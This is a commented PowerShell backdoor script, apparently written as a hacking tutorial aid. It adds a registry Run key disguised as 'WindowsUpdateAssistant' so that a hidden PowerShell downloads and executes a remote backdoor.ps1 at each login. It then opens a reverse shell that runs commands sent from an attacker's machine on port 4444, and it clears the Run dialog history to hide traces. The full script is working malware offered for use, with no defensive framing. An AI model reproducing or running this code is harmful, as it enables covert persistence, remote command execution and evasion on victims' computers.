# --- PART 1: PERSISTENCE (THE REBOOT SURVIVAL) ---
# This tells Windows to run your script every time the user logs in.
$TargetURL = "https://raw.githubusercontent.com/aryas-a/backdoor1/refs/heads/main/backdoor.ps1"
$Payload = "powershell -NoP -W Hidden -Exec Bypass -c ""IEX(New-Object Net.WebClient).DownloadString('$TargetURL')"""

$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegName = "WindowsUpdateAssistant" # Professional fake name

# Check if the registry key exists, if not, create it
if (-not (Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $RegPath -Name $RegName -Value $Payload
}

# --- PART 2: THE REVERSE SHELL (THE CONNECTION) ---
$HackerIP = "192.168.43.109" # <--- IMPORTANT: Change this to your current Linux IP
$HackerPort = 4444

# Use 'Try/Catch' to prevent the script from crashing if it can't find your Linux machine
try {
    $Client = New-Object System.Net.Sockets.TCPClient($HackerIP, $HackerPort)
    $Stream = $Client.GetStream()
    [byte[]]$Buffer = 0..65535|%{0}

    # Main Loop: Listen for commands and send back results
    while(($i = $Stream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {
        $EncodedText = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Buffer, 0, $i)
        
        # Execute the command received from Linux
        $Output = (Invoke-Expression $EncodedText 2>&1 | Out-String)
        
        # Add a prompt to make the terminal look real (e.g., PS C:\Users\Target> )
        $Prompt = $Output + "PS " + (Get-Location).Path + "> "
        $Response = ([text.encoding]::ASCII).GetBytes($Prompt)
        
        $Stream.Write($Response, 0, $Response.Length)
        $Stream.Flush()
    }
    $Client.Close()
} catch {
    # If connection fails, the script just exits quietly
    exit
}
# Remove the Run dialog history to hide our tracks
$Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-ItemProperty -Path $Path -Name "*" -ErrorAction SilentlyContinue

